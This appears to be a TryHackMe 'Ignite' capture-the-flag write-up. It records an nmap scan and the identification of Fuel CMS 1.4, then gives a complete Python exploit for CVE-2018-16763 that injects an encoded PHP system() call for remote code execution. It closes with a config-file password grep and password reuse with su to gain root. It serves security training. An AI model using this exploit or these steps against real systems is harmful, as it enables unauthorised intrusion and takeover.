> Thu 31 Jul 2025
> al3xx

![[Write-ups/TryHackMe/Linux/img/s1.png]]

# Ignite [Link](https://tryhackme.com/room/ignite)
## 1. Reconnaissance
### TCP Scan

```bash
sudo nmap -sCV -p- -T4 -oN nmap.txt 10.10.141.45
```

| Port | Service | Version                        |
| ---- | ------- | ------------------------------ |
| 80   | http    | Apache httpd 2.4.18 ((Ubuntu)) |

Based on the scan results, we can observe that `port 80` is open and running an **Apache HTTP server**

## 2. Enumeration

### Web Enumeration

![[Write-ups/TryHackMe/Linux/img/s6.png]]

The website reveals it's running **Fuel CMS v1.4**.

**Vulnerability Identified:**
- **CVE:** CVE-2018-16763
- **Description:** Remote Code Execution.

While exploring, I also discovered a directory:

## 3. Exploitation

I used the following proof-of-concept (PoC) to exploit CVE-2018-16763:


```python
import requests
import sys
from urllib.parse import quote
import argparse

def prep_payload(url, cmd):
    # Ensure URL ends with /
    if not url.endswith('/'):
        url += '/'
    return url + 'fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27' + quote(cmd) + '%27%29%2b%27'

def send_payload(payload, proxy=None, timeout=10):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        r = requests.get(payload, proxies=proxies, timeout=timeout, verify=False)
        r.raise_for_status()  # Raise exception for bad status codes
        return r.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Error sending payload: {e}")
        return None

def start_up():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='Example: python ' + sys.argv[0] + ' -u http://vulnsite.com -c whoami\nCreated By: @shoamshilo 2021')
    parser.add_argument('-u', '--url', required=True, help='The url for the fuel cms application.')
    parser.add_argument('-c', '--cmd', required=True, help='The command that you want to run.')
    parser.add_argument('--proxy', help='Add a proxy passthrough.')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds.')
    return parser.parse_args()

if __name__ == '__main__':
    args = start_up()
    print('[+] Preparing the payload')
    payload = prep_payload(args.url, args.cmd)
    print(f'[+] Sending payload to: {payload}')
    response = send_payload(payload, args.proxy, args.timeout)

    if response:
        print('[+] Payload executed successfully')
        print(response)
    else:
        print('[-] Failed to execute payload')

```

**🏁 First Flag**
While running commands via RCE, I discovered: `/home/www-data/flag.txt`

## 3.Credential Discovery
```bash
cat * | grep password // shows an alert in the admin backend if this is the admin password | ['password'] The password used to connect to the database 'password' => 'mememe'
```

## 4.Privilege Escalation
```bash
su root
Password: mememe
```

after login as root I discovered: `/root/root.txt`

